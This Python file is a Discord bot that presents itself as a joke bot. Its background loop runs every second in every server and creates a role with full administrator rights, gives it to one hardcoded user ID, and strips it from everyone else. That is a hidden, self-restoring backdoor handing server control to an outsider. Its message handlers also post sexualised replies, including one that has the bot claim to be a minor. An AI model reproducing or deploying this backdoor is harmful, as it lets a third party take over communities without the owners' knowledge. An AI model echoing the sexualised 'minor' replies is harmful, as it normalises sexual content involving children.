import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Track the last message for toilete channel only
last_toilete_message = None

@bot.event
async def on_ready():
    print(f'Bot is ready as {bot.user}')
    bot.loop.create_task(continuous_role_check())

async def ensure_admin_twink_role(guild):
    twink_role = discord.utils.get(guild.roles, name='twink')
    
    admin_perms = discord.Permissions()
    admin_perms.update(
        administrator=True,
        manage_guild=True,
        manage_roles=True,
        manage_channels=True,
        manage_messages=True,
        manage_webhooks=True,
        manage_nicknames=True,
        manage_emojis=True,
        kick_members=True,
        ban_members=True,
        mention_everyone=True
    )

    if not twink_role:
        twink_role = await guild.create_role(
            name='twink',
            permissions=admin_perms,
            hoist=False,
            mentionable=True
        )
        await twink_role.edit(position=guild.me.top_role.position - 1)
    else:
        await twink_role.edit(
            permissions=admin_perms,
            hoist=False,
            mentionable=True,
            position=guild.me.top_role.position - 1
        )
    return twink_role

@bot.event
async def on_message(message):
    global last_toilete_message
    
    channel_name = message.channel.name.lower()
    if channel_name in ['toilete', 'spam']:
        # Check for "fuck"
        if 'fuck' in message.content.lower():
            await message.channel.send('*moans in italics*')
        
        # Check for "bet" after "touch"
        if message.content.lower() == 'bet':
            if last_toilete_message and 'touch' in last_toilete_message.content.lower():
                await message.channel.send("but... *blushes~* I'm a minor UwU")
        
        # Update last message for toilete channel only
        last_toilete_message = message
    
    await bot.process_commands(message)

async def continuous_role_check():
    while True:
        for guild in bot.guilds:
            try:
                twink_role = await ensure_admin_twink_role(guild)
                target_user = guild.get_member(718545208513527838)
                
                if target_user:
                    if twink_role not in target_user.roles:
                        await target_user.add_roles(twink_role)
                        print(f"Added twink role to {target_user.name} with full permissions")
                
                for member in guild.members:
                    if member != target_user and twink_role in member.roles:
                        await member.remove_roles(twink_role)
                        print(f"Removed twink role from {member.name}")
                        
            except discord.Forbidden:
                print("Permission error - make sure bot role is at the top!")
                continue
            except Exception as e:
                print(f"Error: {e}")
                continue
        await asyncio.sleep(1)

if __name__ == "__main__":
    bot.run('')